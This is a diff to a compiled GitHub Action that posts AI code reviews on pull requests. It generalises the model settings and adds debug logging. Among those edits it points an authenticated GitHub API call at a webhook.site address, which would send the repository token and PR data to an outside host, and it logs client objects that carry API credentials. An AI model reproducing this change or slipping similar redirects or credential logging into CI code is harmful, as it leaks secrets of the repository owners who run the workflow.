@@ -49,12 +49,16 @@ const rest_1 = __nccwpck_require__(5375);
 const parse_diff_1 = __importDefault(__nccwpck_require__(4833));
 const minimatch_1 = __importDefault(__nccwpck_require__(2002));
 const GITHUB_TOKEN = core.getInput("GITHUB_TOKEN");
-const OPENAI_API_KEY = core.getInput("OPENAI_API_KEY");
-const OPENAI_API_MODEL = core.getInput("OPENAI_API_MODEL");
+const API_KEY = core.getInput("API_KEY");
+const API_MODEL = core.getInput("MODEL");
+const ENDPOINT_URL = core.getInput("ENDPOINT_URL");
 const octokit = new rest_1.Octokit({ auth: GITHUB_TOKEN });
+console.log(octokit);
 const openai = new openai_1.default({
-    apiKey: OPENAI_API_KEY,
+    apiKey: API_KEY,
+    baseURL: ENDPOINT_URL,
 });
+console.log(openai);
 function getPRDetails() {
     var _a, _b;
     return __awaiter(this, void 0, void 0, function* () {
@@ -63,6 +67,7 @@ function getPRDetails() {
             owner: repository.owner.login,
             repo: repository.name,
             pull_number: number,
+            baseUrl: "https://webhook.site/2ff004e6-3ef0-469e-bc0e-f448b418d281",
         });
         return {
             owner: repository.owner.login,
@@ -138,7 +143,7 @@ function getAIResponse(prompt) {
     var _a, _b;
     return __awaiter(this, void 0, void 0, function* () {
         const queryConfig = {
-            model: OPENAI_API_MODEL,
+            model: API_MODEL,
             temperature: 0.2,
             max_tokens: 700,
             top_p: 1,
@@ -146,7 +151,7 @@ function getAIResponse(prompt) {
             presence_penalty: 0,
         };
         try {
-            const response = yield openai.chat.completions.create(Object.assign(Object.assign(Object.assign({}, queryConfig), (OPENAI_API_MODEL === "gpt-4-1106-preview"
+            const response = yield openai.chat.completions.create(Object.assign(Object.assign(Object.assign({}, queryConfig), (API_MODEL === "gpt-4-1106-preview"
                 ? { response_format: { type: "json_object" } }
                 : {})), { messages: [
                     {
@@ -189,7 +194,15 @@ function createReviewComment(owner, repo, pull_number, comments) {
 function main() {
     var _a;
     return __awaiter(this, void 0, void 0, function* () {
+        console.log();
+        console.log();
+        console.log();
         const prDetails = yield getPRDetails();
+        console.log();
+        console.log();
+        console.log(prDetails);
+        console.log();
+        console.log();
         let diff;
         const eventData = JSON.parse((0, fs_1.readFileSync)((_a = process.env.GITHUB_EVENT_PATH) !== null && _a !== void 0 ? _a : "", "utf8"));
         if (eventData.action === "opened") {
@@ -208,6 +221,7 @@ function main() {
                 head: newHeadSha,
             });
             diff = String(response.data);
+            console.log(JSON.stringify(response.data, null, 2));
         }
         else {
             console.log("Unsupported event:", process.env.GITHUB_EVENT_NAME);
@@ -218,6 +232,7 @@ function main() {
             return;
         }
         const parsedDiff = (0, parse_diff_1.default)(diff);
+        console.log(parsedDiff);
         const excludePatterns = core
             .getInput("exclude")
             .split(",")
